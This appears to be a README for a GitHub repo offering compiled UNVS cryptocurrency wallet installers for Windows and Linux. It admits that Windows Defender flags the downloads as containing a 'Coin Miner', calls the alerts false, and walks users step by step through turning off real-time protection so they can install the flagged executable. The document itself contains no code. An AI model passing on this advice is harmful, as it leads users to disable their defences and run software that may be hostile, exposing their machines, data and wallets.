**COMPILED DESKTOP WALLET RELEASES**
------------------------------------

This repo contains our **Most Recent** compiled Windows 32bit Wallet & Linux Wallet releases.

These have all main dependancies compiled within, therefore should run as normal without any additional dependancies being required on your system, apart from Linux QT Runtime being required (see below).

**FOR WINDOWS 32BIT WALLET:**

https://github.com/UnvsCom/Current-Wallet-Releases/raw/main/unvs-win32-setup.exe

Install and allow through firewall if prompted.

**FOR LINUX WALLET:**

https://github.com/UnvsCom/Current-Wallet-Releases/raw/main/unvs-qt-linux-setup

**On Linux, YOU NEED the Qt4 run-time libraries** to run the UNVS-Qt wallet program. On Debian or Ubuntu enter via terminal:

```
sudo apt-get install libqtgui4
```

Both Wallets should auto sync via the hardcoded IP nodes and DNS Seeders. Do not add random untrusted IP nodes manually to speed up syncing! Only add our official IPs stated on our website at [UNVS.com/wallet-guide](https://www.unvs.com/wallet-guide)

✪ 'COINMINER' ANTIVIRUS ISSUES - DOWNLOAD ISSUES SIDENOTE
--------
Sometimes operating systems don't like supporting cryptocurrency software due to their mining scripts and abilities.

With that being said our download files/folders sometimes provide false Windows Defender virus alerts due to them containing a **Coin Miner**

When this occurs Windows can either refuse to install the Wallet or even fully refuse to allow a download of the tar.gz or installation file.

If you believe that a file you downloaded is genuine, you can bypass the **“Operation did not complete successfully because the file contains a virus”** warning. To do this, you’ll have to temporarily disable Windows Defender, and open the file while it’s turned off.


✪ **Workaround Method 1. Temporarily Disable Windows Defender** ✪ 
<br>            
**WINDOWS 10 / 11.**
1) Go to Windows **'Start'** menu & choose **Settings**, or alternatively **use the Windows + i shortcut**.


2) On the left click on **'Privacy & Security'**

3) At the top click **'Windows Security'**

4) Then click on **'Virus & threat protection'**

5) First, click on the **'Manage settings'** link under the **'Virus & threat protection'** settings header. 

6) You’ll be redirected to a new page. Here, **click on the Real-time protection toggle to turn off Windows Defender**.

Then you should be able to download and install freely. You can even activate Windows Defender after installation. Ensure to allow connections through any firewall.
